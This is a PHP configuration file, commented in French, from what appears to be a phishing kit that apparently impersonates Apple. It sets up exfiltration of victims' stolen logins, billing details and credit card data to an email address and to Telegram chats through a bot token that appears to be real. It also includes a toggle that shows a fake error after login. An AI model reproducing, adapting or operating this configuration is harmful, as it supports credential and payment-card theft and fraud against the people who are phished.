﻿<?php


##### SETTINGS ######


# Mail
$mail_sending = true;                                           # False pour ne pas recevoir par Mail
$rezmail = "x13test@skiff.com"; 

#Telegram
$telegram_sending = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "6120068138:AAE4a0FPWEYahnJvM9777iAG1k16U2tuPeU";
$chat_login = "240837047";                                 # Channel de réception des logins
$chat_billing = "240837047";                               # Channel de réception des billings ( Page d'informations )
$chat_card = "240837047";                                  # Channel de réception des cardings ( Page de carte de crédit )

$error_after_login = true;                          # False pour désactiver le message après la connexion
$apple = true;

## Ne pas toucher
$test_mode = false;

?>